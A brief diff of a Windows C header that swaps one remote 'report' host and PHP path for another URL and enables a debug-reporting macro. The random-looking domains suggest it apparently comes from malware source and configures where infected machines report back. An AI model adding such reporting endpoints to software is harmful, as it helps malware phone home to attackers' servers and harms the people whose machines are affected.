@@ -3,11 +3,11 @@
 
 #include <windows.h>
 
-#define PP_REPORT_HOST "ceryti.in"
-#define PP_REPORT_PATH "/geter/indexpld.php?"
-#define PP_REPORT_URL  "http://" PP_REPORT_HOST PP_REPORT_PATH
+#define PP_REPORT_URL  "http://56tgvr.info/geter/index_.php"
 
 //#define PP_DBGRPT_FUNCTION_CALL(function) __noop
+
+#define DBGRPT_ENABLED
 
 #ifdef DBGRPT_ENABLED
 #	define PP_DBGRPT_FUNCTION_CALL(function) { (function); };
